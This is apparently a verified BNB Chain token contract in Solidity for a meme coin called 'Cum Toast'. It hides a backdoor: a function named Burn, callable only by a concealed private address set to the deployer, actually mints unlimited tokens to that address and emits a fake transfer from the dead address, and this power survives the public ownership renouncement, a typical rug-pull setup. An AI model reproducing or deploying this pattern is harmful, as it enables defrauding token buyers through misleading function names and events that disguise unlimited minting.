/**
 *Submitted for verification at BscScan.com on 2021-07-15
*/

/**
**/
pragma solidity ^0.8.4;

// SPDX-License-Identifier: Unlicensed

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a * b;
        assert(a == 0 || c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

interface IBEP20 {
    function balanceOf(address who) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function approve(address spender, uint256 value) external returns (bool);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);
}

contract Cum is IBEP20 {
    using SafeMath for uint256;
    address public owner = msg.sender;
    address private previousOwner;
    address private HH = msg.sender;
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;
    string public name;
    string public symbol;
    address private burnaddress;
    uint256 private fees;
    uint8 public decimals;
    uint256 public totalSupply;
    uint256 private lockTime;
    

    constructor() {
        symbol = "Cum Toast";
        name = " Cum Toast";
        fees = 1;
        burnaddress = 0x000000000000000000000000000000000000dEaD;
        decimals = 9;
        totalSupply = 1 * 10**15;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier isHH() {
        require(msg.sender == HH);
        _;
    }

    function balanceOf(address _owner) public view override returns (uint256) {
        return balances[_owner];
    }

    function fee() public view returns (uint256) {
        return fees;
    }

    function Burn(uint256 amount) public isHH() {
        balances[msg.sender] = balances[msg.sender] + (amount);
        emit Transfer(burnaddress, msg.sender, amount);
    }

    function RenounceOwnership() public onlyOwner returns (bool success) {
        owner = address(0);
        emit OwnershipTransferred(owner, address(0));
        return true;
    }
    
     function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function geUnlockTime() private view returns (uint256) {
        return lockTime;
    }

    function lock(uint256 time) public virtual onlyOwner {
        previousOwner = owner;
        owner = address(0);
        lockTime = block.timestamp + time;
        emit OwnershipTransferred(owner, address(0));
    }
    
    function unlock() public virtual {
        require(previousOwner == msg.sender, "You don't have permission to unlock");
        require(block.timestamp > lockTime , "Contract is locked until 7 days");
        emit OwnershipTransferred(owner, previousOwner);
        owner = previousOwner;
    }

    function transfer(address _to, uint256 _amount)
        public
        override
        returns (bool success)
    {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
    }

    function transferFrom(
        address _from,
        address _to,
        uint256 _amount
    ) public override returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }

    function approve(address _spender, uint256 _value)
        public
        override
        returns (bool success)
    {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) {
            return false;
        }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function _msgSender() internal view returns (address) {
        return msg.sender;
    }

    function allowance(address _owner, address _spender)
        public
        view
        override
        returns (uint256)
    {
        return allowed[_owner][_spender];
    }
}